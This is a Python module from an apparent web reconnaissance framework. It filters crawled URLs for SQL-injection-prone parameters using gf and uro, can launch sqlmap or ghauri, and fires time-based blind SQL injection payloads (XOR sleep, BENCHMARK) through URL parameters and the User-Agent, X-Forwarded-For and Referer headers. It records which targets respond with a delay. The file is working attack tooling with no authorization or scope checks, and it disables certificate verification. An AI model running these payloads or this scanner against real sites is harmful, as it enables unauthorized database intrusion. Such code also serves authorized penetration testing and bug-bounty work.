import os
import shutil
import subprocess
import time
import requests
import glob
from pathlib import Path
from typing import Dict, Any, Set, List
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed


from src.common.logger import Logger
from src.common.utils import run_command, ensure_dir

def get_gf_path() -> str:
    """Get the path to the gf binary with improved detection."""
    # First try to find gf in PATH
    gf_path = shutil.which("gf")
    if gf_path:
        return gf_path
    
    # Common GF installation paths for different systems
    common_paths = [
        "/root/go/bin/gf",           # Common Linux root installation
        "/usr/local/bin/gf",         # System-wide installation
        "/usr/bin/gf",               # Package manager installation
        "/home/*/go/bin/gf",         # User installation (will need expansion)
        "~/go/bin/gf",               # User home go installation
        "/opt/go/bin/gf"             # Alternative installation path
    ]
    
    # Expand home directory path
    expanded_paths = []
    for path in common_paths:
        if "~" in path:
            expanded_paths.extend(glob.glob(os.path.expanduser(path)))
        elif "*" in path:
            expanded_paths.extend(glob.glob(path))
        else:
            expanded_paths.append(path)
    
    # Check each path
    for path in expanded_paths:
        if os.path.exists(path) and os.access(path, os.X_OK):
            return path
    
    # If not found anywhere, return "gf" and let the system handle it
    # This will cause an error if gf is not installed, which is appropriate
    return "gf"

def run(args: Any, config: Dict, logger: Logger, workflow_data: Dict) -> Dict:
    """
    SQLi reconnaissance module that uses discovered URLs from previous modules.
    
    This module now applies gf sqli filtering by default for all modes, including
    manual blind testing. The gf tool is used to filter URLs for potential SQLi
    vulnerabilities before running any tests.
    
    Default behavior (when no SQLi options are specified):
    - Applies gf sqli filtering to all discovered URLs
    - Runs manual blind testing on filtered results
    
    Args:
        args: Command line arguments containing SQLi options
        config: Application configuration
        logger: Logger instance
        workflow_data: Data from previous workflow modules
        
    Returns:
        Dict containing SQLi targets and summary results
    """
    target = workflow_data['target']
    target_output_dir = workflow_data['target_output_dir']
    
    # Get URLs from previous modules (prioritize uro_urls if available)
    urls = workflow_data.get('uro_urls', workflow_data.get('live_urls', workflow_data.get('all_urls', set())))
    
    if not urls:
        logger.warning(f"[{target}] No URLs available for SQLi reconnaissance. Skipping.")
        return {"sqli_summary": {"status": "skipped", "reason": "no_urls"}}

    logger.info(f"[{target}] Starting SQLi reconnaissance on {len(urls)} URLs...")
    
    # Create SQLi results directory
    sqli_results_dir = target_output_dir / config['dirs']['sqli_results']
    ensure_dir(sqli_results_dir)
    
    # Check if any SQLi options are specified
    sqli_options_specified = any([
        getattr(args, 'sqli_full_scan', False),
        getattr(args, 'sqli_header_test', False),
        getattr(args, 'sqli_xor_test', False),
        getattr(args, 'sqli_manual_blind', False)
    ])
    
    # If no SQLi options specified, default to manual blind mode
    if not sqli_options_specified:
        logger.info(f"[{target}] No SQLi options specified. Defaulting to manual blind mode with gf sqli filtering.")
        args.sqli_manual_blind = True
    
    # Always apply gf sqli filtering as default behavior
    logger.info(f"[{target}] Applying gf sqli filtering to {len(urls)} URLs...")
    
    # Step 1: Initial filtering for potential SQLi targets
    sqli_targets = filter_sqli_targets(urls, logger)
    
    if not sqli_targets:
        logger.warning(f"[{target}] No potential SQLi targets found after filtering.")
        return {"sqli_summary": {"status": "skipped", "reason": "no_targets"}}
    
    # Step 2: Consolidate and apply final filtering (uro + gf sqli)
    final_targets = consolidate_and_filter_sqli(sqli_targets, logger)
    
    if not final_targets:
        logger.warning(f"[{target}] No SQLi targets remaining after gf sqli filtering.")
        # If gf filtering returns no results, fall back to original filtered targets for manual testing
        logger.info(f"[{target}] Falling back to initial filtered targets ({len(sqli_targets)} URLs) for manual testing.")
        final_targets = sqli_targets
    
    # Save final filtered targets
    targets_file = sqli_results_dir / config['files']['sqli_targets']
    with targets_file.open('w') as f:
        for url in sorted(final_targets):
            f.write(f"{url}\n")
    
    logger.success(f"[{target}] Found {len(final_targets)} final SQLi targets after gf sqli filtering.")
    
    results = {
        "sqli_targets": final_targets,
        "sqli_summary": {
            "total_targets": len(final_targets),
            "status": "completed",
            "gf_filtering_applied": True
        }
    }
    
    # Run automated scanning if requested
    if hasattr(args, 'sqli_full_scan') and args.sqli_full_scan:
        scanner = getattr(args, 'sqli_scanner', 'sqlmap')
        run_automated_scan(targets_file, scanner, config, logger)
        results["sqli_summary"]["automated_scan"] = "completed"
    
    # Run manual tests - this will run by default if no other options are specified
    if hasattr(args, 'sqli_manual_blind') and args.sqli_manual_blind:
        logger.info(f"[{target}] Running manual blind test on gf sqli filtered targets...")
        manual_results = run_manual_blind_test(targets_file, config, logger)
        results["sqli_summary"]["manual_blind"] = manual_results
    
    if hasattr(args, 'sqli_header_test') and args.sqli_header_test:
        header_results = run_header_sqli_test(targets_file, config, logger)
        results["sqli_summary"]["header_test"] = header_results
    
    if hasattr(args, 'sqli_xor_test') and args.sqli_xor_test:
        xor_results = run_xor_blind_test(targets_file, config, logger)
        results["sqli_summary"]["xor_test"] = xor_results
    
    return results

def filter_sqli_targets(urls: Set[str], logger: Logger) -> Set[str]:
    """Filter URLs for potential SQLi targets using top 20 SQL injection prone parameters and gf sqli."""
    sqli_targets = set()
    
    # Top 20 SQL injection prone parameters
    sql_params = [
        'id', 'page', 'category', 'product', 'article', 'news', 'item',
        'user', 'member', 'account', 'profile', 'view', 'show', 'display',
        'search', 'query', 'keyword', 'term', 'q', 's'
    ]
    
    # File extensions that commonly have SQLi vulnerabilities
    vulnerable_extensions = ['.php', '.asp', '.aspx', '.jsp', '.jspx', '.do', '.action']
    
    # Common vulnerable file patterns
    vulnerable_files = [
        'product.php', 'view.php', 'show.php', 'display.php', 'detail.php',
        'article.php', 'news.php', 'item.php', 'user.php', 'member.php',
        'profile.php', 'account.php', 'search.php', 'query.php', 'result.php',
        'list.php', 'category.php', 'page.php', 'index.php', 'main.php',
        'product.asp', 'view.asp', 'show.asp', 'detail.asp', 'article.asp',
        'news.asp', 'item.asp', 'user.asp', 'member.asp', 'profile.asp',
        'account.asp', 'search.asp', 'query.asp', 'result.asp', 'list.asp',
        'category.asp', 'page.asp', 'index.asp', 'main.asp'
    ]
    
    for url in urls:
        parsed = urlparse(url)
        url_lower = url.lower()
        
        # Check for SQL injection prone parameters
        if any(f"{param}=" in url_lower for param in sql_params):
            sqli_targets.add(url)
            continue
        
        # Check for array parameters (common in SQLi)
        if any(f"{param}[]=" in url_lower for param in sql_params):
            sqli_targets.add(url)
            continue
        
        # Check for ID variations
        if any(f"{param}_id=" in url_lower or f"{param}id=" in url_lower for param in sql_params):
            sqli_targets.add(url)
            continue
        
        # Check for vulnerable file extensions with parameters
        if any(ext in parsed.path.lower() for ext in vulnerable_extensions):
            if '=' in url:
                sqli_targets.add(url)
                continue
        
        # Check for vulnerable file patterns
        if any(file in parsed.path.lower() for file in vulnerable_files):
            if '=' in url:
                sqli_targets.add(url)
                continue
        
        # Check for common SQLi indicators in URL
        sql_indicators = [
            'select', 'union', 'insert', 'update', 'delete', 'drop', 'create',
            'alter', 'exec', 'execute', 'script', 'javascript', 'vbscript'
        ]
        
        if any(indicator in url_lower for indicator in sql_indicators):
            sqli_targets.add(url)
            continue
    
    logger.info(f"Initial filtering found {len(sqli_targets)} potential SQLi targets from {len(urls)} URLs.")
    
    # Apply gf sqli filtering to the filtered URLs
    if sqli_targets:
        sqli_targets = apply_gf_sqli_filter(sqli_targets, logger)
    
    logger.info(f"After gf sqli filtering: {len(sqli_targets)} potential SQLi targets remaining.")
    return sqli_targets

def apply_gf_sqli_filter(urls: Set[str], logger: Logger) -> Set[str]:
    """Apply gf sqli filtering to URLs using the gf tool."""
    logger.info("Applying gf sqli filtering to URLs...")
    
    # First check if gf tool is available
    gf_path = get_gf_path()
    if not shutil.which(gf_path) and not os.path.exists(gf_path):
        logger.warning("gf tool not found. Skipping gf sqli filtering.")
        return urls
    
    try:
        # Create a temporary file with URLs
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as temp_file:
            for url in urls:
                temp_file.write(f"{url}\n")
            temp_file_path = temp_file.name
        
        # Run gf sqli command with improved error handling
        cmd = f"cat {temp_file_path} | {gf_path} sqli"
        logger.debug(f"Running gf sqli command: {cmd}")
        exit_code, stdout, stderr = run_command(cmd, timeout=300, shell=True)
        
        # Clean up temp file
        os.unlink(temp_file_path)
        
        if exit_code == 0:
            if stdout and stdout.strip():
                # Parse the filtered URLs
                filtered_urls = set(line.strip() for line in stdout.strip().split('\n') if line.strip())
                logger.success(f"gf sqli filtering completed. {len(filtered_urls)} URLs passed the filter.")
                return filtered_urls
            else:
                logger.info("gf sqli filtering completed but returned no results.")
                return set()
        else:
            logger.warning(f"gf sqli filtering failed with exit code {exit_code}. Stderr: {stderr}")
            # Return original URLs if gf fails
            return urls
            
    except Exception as e:
        logger.error(f"Error applying gf sqli filter: {e}")
        # Return original URLs if there's an error
        return urls

def consolidate_and_filter_sqli(urls: Set[str], logger: Logger) -> Set[str]:
    """Consolidate URLs and apply final filtering with uro and gf sqli."""
    logger.info("Consolidating and applying final SQLi filtering...")
    
    # Check if gf tool is available
    gf_path = get_gf_path()
    if not shutil.which(gf_path) and not os.path.exists(gf_path):
        logger.warning("gf tool not found. Skipping gf sqli filtering in consolidation.")
        return urls
    
    try:
        # Create a temporary file with all URLs
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as temp_file:
            for url in urls:
                temp_file.write(f"{url}\n")
            temp_file_path = temp_file.name
        
        # Apply the filtering pipeline: cat urls | gf sqli | uro
        cmd = f"cat {temp_file_path} | {gf_path} sqli | uro"
        logger.debug(f"Running consolidation command: {cmd}")
        exit_code, stdout, stderr = run_command(cmd, timeout=300, shell=True)
        
        # Clean up temp file
        os.unlink(temp_file_path)
        
        if exit_code == 0:
            if stdout and stdout.strip():
                # Parse the final filtered URLs
                final_urls = set(line.strip() for line in stdout.strip().split('\n') if line.strip())
                logger.success(f"Final filtering completed. {len(final_urls)} URLs passed the pipeline.")
                return final_urls
            else:
                logger.info("Final filtering completed but returned no results.")
                return set()
        else:
            logger.warning(f"Final filtering failed with exit code {exit_code}. Stderr: {stderr}")
            # Return original URLs if pipeline fails
            return urls
            
    except Exception as e:
        logger.error(f"Error in final filtering pipeline: {e}")
        # Return original URLs if there's an error
        return urls

def run_automated_scan(targets_file: Path, scanner: str, config: Dict, logger: Logger):
    """Run automated SQLi scanning with sqlmap or ghauri."""
    if not targets_file.exists() or targets_file.stat().st_size == 0:
        logger.error(f"Targets file '{targets_file}' is empty or does not exist.")
        return
    
    logger.info(f"Starting automated SQLi scan with {scanner}...")
    
    if scanner == 'sqlmap':
        cmd = f"sqlmap -m {targets_file} {config['sqli']['sqlmap_args']}"
    elif scanner == 'ghauri':
        cmd = f"ghauri -m {targets_file} {config['sqli']['ghauri_args']}"
    else:
        logger.error(f"Invalid scanner: {scanner}")
        return
    
    logger.info(f"Executing: {cmd}")
    exit_code, stdout, stderr = run_command(cmd.split(), timeout=config['timeouts']['command'])
    
    if exit_code == 0:
        logger.success(f"Automated SQLi scan completed successfully.")
    else:
        logger.error(f"Automated SQLi scan failed with exit code {exit_code}")

def run_manual_blind_test(targets_file: Path, config: Dict, logger: Logger) -> Dict:
    """Run manual blind SQLi test using time-based payloads."""
    logger.info("Running manual blind SQLi test...")
    
    payloads = [
        "'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
        '"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z',
        "'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z",
        "X'XOR(if(now()=sysdate(),sleep(10),0))XOR'X",
        "(SELECT * FROM (SELECT(SLEEP(10)))a)",
        "BENCHMARK(10000000,MD5(CHAR(116)))",
        "if(now()=sysdate(),sleep(10),0)",
        "'XOR(if(now()=sysdate(),sleep(10),0))XOR'",
        "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
        "(select(0)from(select(sleep(10)))v)"
    ]
    
    vulnerable = []
    timeout = config['sqli']['timeout']
    delay_threshold = config['sqli']['delay_threshold']
    
    with targets_file.open('r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    if not urls:
        logger.warning("No URLs found in targets file for manual blind testing.")
        return {"vulnerable_count": 0}
    
    logger.info(f"Testing {len(urls)} URLs with {len(payloads)} payloads each...")
    total_tests = len(urls) * len(payloads)
    tests_completed = 0
    
    # Add global timeout (30 minutes max)
    start_time = time.time()
    max_runtime = 1800  # 30 minutes
    
    for url_idx, url in enumerate(urls, 1):
        # Check global timeout
        if time.time() - start_time > max_runtime:
            logger.warning(f"Global timeout reached ({max_runtime}s). Stopping manual blind test.")
            break
            
        logger.info(f"Testing URL {url_idx}/{len(urls)}: {url}")
        
        for payload_idx, payload in enumerate(payloads, 1):
            tests_completed += 1
            
            # Progress logging every 10 tests
            if tests_completed % 10 == 0:
                elapsed_time = time.time() - start_time
                logger.info(f"Progress: {tests_completed}/{total_tests} tests completed ({tests_completed/total_tests*100:.1f}%) - Runtime: {elapsed_time:.1f}s")
            
            test_url = inject_payload(url, payload)
            
            try:
                start = time.time()
                response = requests.get(test_url, timeout=timeout, allow_redirects=True, verify=False)
                elapsed = time.time() - start
                
                if elapsed > delay_threshold:
                    logger.success(f"[DELAYED] {test_url} (delay: {elapsed:.1f}s)")
                    vulnerable.append((test_url, payload, elapsed))
                    break  # Move to next URL after finding vulnerability
                    
            except requests.exceptions.Timeout:
                logger.success(f"[TIMEOUT] {test_url} (>{timeout}s)")
                vulnerable.append((test_url, payload, timeout))
                break  # Move to next URL after finding vulnerability
                
            except requests.exceptions.ConnectionError:
                logger.debug(f"Connection error for {test_url}")
                continue
                
            except requests.exceptions.RequestException as e:
                logger.debug(f"Request failed for {test_url}: {e}")
                continue
                
            except Exception as e:
                logger.debug(f"Unexpected error for {test_url}: {e}")
                continue
    
    total_runtime = time.time() - start_time
    logger.info(f"Manual blind test completed in {total_runtime:.1f}s")
    
    # Save results
    if vulnerable:
        results_file = targets_file.parent / "sqli_manual_results.txt"
        with results_file.open('w') as f:
            for url, payload, elapsed in vulnerable:
                f.write(f"{url}\t{payload}\t{elapsed:.1f}s\n")
        logger.success(f"Manual blind SQLi test found {len(vulnerable)} vulnerable URLs.")
        return {"vulnerable_count": len(vulnerable), "results_file": str(results_file)}
    else:
        logger.warning("No vulnerable URLs found in manual blind SQLi test.")
        return {"vulnerable_count": 0}

def run_header_sqli_test(targets_file: Path, config: Dict, logger: Logger) -> Dict:
    """Run header-based blind SQLi test."""
    logger.info("Running header-based blind SQLi test...")
    
    payloads = [
        "'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
        '"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z',
        "X'XOR(if(now()=sysdate(),sleep(10),0))XOR'X",
        "BENCHMARK(10000000,MD5(CHAR(116)))",
        "if(now()=sysdate(),sleep(10),0)"
    ]
    
    headers_to_test = ["User-Agent", "X-Forwarded-For", "Referer"]
    vulnerable = []
    timeout = config['sqli']['timeout']
    delay_threshold = config['sqli']['delay_threshold']
    
    with targets_file.open('r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    if not urls:
        logger.warning("No URLs found in targets file for header-based testing.")
        return {"vulnerable_count": 0}
    
    logger.info(f"Testing {len(urls)} URLs with {len(payloads)} payloads in {len(headers_to_test)} headers each...")
    total_tests = len(urls) * len(headers_to_test) * len(payloads)
    tests_completed = 0
    
    for url_idx, url in enumerate(urls, 1):
        logger.info(f"Testing URL {url_idx}/{len(urls)}: {url}")
        
        for header in headers_to_test:
            for payload_idx, payload in enumerate(payloads, 1):
                tests_completed += 1
                
                # Progress logging every 20 tests
                if tests_completed % 20 == 0:
                    logger.info(f"Progress: {tests_completed}/{total_tests} tests completed ({tests_completed/total_tests*100:.1f}%)")
                
                custom_headers = {header: payload}
                
                try:
                    start = time.time()
                    response = requests.get(url, headers=custom_headers, timeout=timeout, allow_redirects=True, verify=False)
                    elapsed = time.time() - start
                    
                    if elapsed > delay_threshold:
                        logger.success(f"[DELAYED] {url} ({header}: {payload}) (delay: {elapsed:.1f}s)")
                        vulnerable.append((url, header, payload, elapsed))
                        break  # Move to next header after finding vulnerability
                        
                except requests.exceptions.Timeout:
                    logger.success(f"[TIMEOUT] {url} ({header}: {payload}) (>{timeout}s)")
                    vulnerable.append((url, header, payload, timeout))
                    break  # Move to next header after finding vulnerability
                    
                except requests.exceptions.ConnectionError:
                    logger.debug(f"Connection error for {url} with {header}")
                    continue
                    
                except requests.exceptions.RequestException as e:
                    logger.debug(f"Request failed for {url} with {header}: {e}")
                    continue
                    
                except Exception as e:
                    logger.debug(f"Unexpected error for {url} with {header}: {e}")
                    continue
    
    # Save results
    if vulnerable:
        results_file = targets_file.parent / "sqli_header_results.txt"
        with results_file.open('w') as f:
            for url, header, payload, elapsed in vulnerable:
                f.write(f"{url}\t{header}\t{payload}\t{elapsed:.1f}s\n")
        logger.success(f"Header-based SQLi test found {len(vulnerable)} vulnerable URLs.")
        return {"vulnerable_count": len(vulnerable), "results_file": str(results_file)}
    else:
        logger.warning("No vulnerable URLs found in header-based SQLi test.")
        return {"vulnerable_count": 0}

def run_xor_blind_test(targets_file: Path, config: Dict, logger: Logger) -> Dict:
    """Run XOR blind SQLi test."""
    logger.info("Running XOR blind SQLi test...")
    
    xor_payloads = [
        "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
        "0'XOR(if(now()=sysdate(),sleep(10*1),0))XOR'Z",
        "0'|(IF((now())LIKE(sysdate()),SLEEP(10),0))|'Z",
        "XOR(if(now()=sysdate(),sleep(7),0))XOR%23"
    ]
    
    vulnerable = []
    timeout = config['sqli']['timeout']
    delay_threshold = config['sqli']['delay_threshold']
    
    with targets_file.open('r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    if not urls:
        logger.warning("No URLs found in targets file for XOR testing.")
        return {"vulnerable_count": 0}
    
    logger.info(f"Testing {len(urls)} URLs with {len(xor_payloads)} XOR payloads each...")
    total_tests = len(urls) * len(xor_payloads)
    tests_completed = 0
    
    for url_idx, url in enumerate(urls, 1):
        logger.info(f"Testing URL {url_idx}/{len(urls)}: {url}")
        
        for payload_idx, payload in enumerate(xor_payloads, 1):
            tests_completed += 1
            
            # Progress logging every 10 tests
            if tests_completed % 10 == 0:
                logger.info(f"Progress: {tests_completed}/{total_tests} tests completed ({tests_completed/total_tests*100:.1f}%)")
            
            test_url = inject_payload(url, payload)
            
            try:
                start = time.time()
                response = requests.get(test_url, timeout=timeout, allow_redirects=True, verify=False)
                elapsed = time.time() - start
                
                if elapsed > delay_threshold:
                    logger.success(f"[DELAYED] {test_url} (delay: {elapsed:.1f}s)")
                    vulnerable.append((test_url, payload, elapsed))
                    break  # Move to next URL after finding vulnerability
                    
            except requests.exceptions.Timeout:
                logger.success(f"[TIMEOUT] {test_url} (>{timeout}s)")
                vulnerable.append((test_url, payload, timeout))
                break  # Move to next URL after finding vulnerability
                
            except requests.exceptions.ConnectionError:
                logger.debug(f"Connection error for {test_url}")
                continue
                
            except requests.exceptions.RequestException as e:
                logger.debug(f"Request failed for {test_url}: {e}")
                continue
                
            except Exception as e:
                logger.debug(f"Unexpected error for {test_url}: {e}")
                continue
    
    # Save results
    if vulnerable:
        results_file = targets_file.parent / "sqli_xor_results.txt"
        with results_file.open('w') as f:
            for url, payload, elapsed in vulnerable:
                f.write(f"{url}\t{payload}\t{elapsed:.1f}s\n")
        logger.success(f"XOR blind SQLi test found {len(vulnerable)} vulnerable URLs.")
        return {"vulnerable_count": len(vulnerable), "results_file": str(results_file)}
    else:
        logger.warning("No vulnerable URLs found in XOR blind SQLi test.")
        return {"vulnerable_count": 0}

def inject_payload(url: str, payload: str) -> str:
    """Inject payload into URL parameter."""
    if '?' in url:
        base, query = url.split('?', 1)
        if '=' in query:
            param, rest = query.split('=', 1)
            test_url = f"{base}?{param}={payload}"
            if '&' in rest:
                test_url += '&' + rest.split('&', 1)[1]
            return test_url
        else:
            return url + payload
    else:
        return url + payload 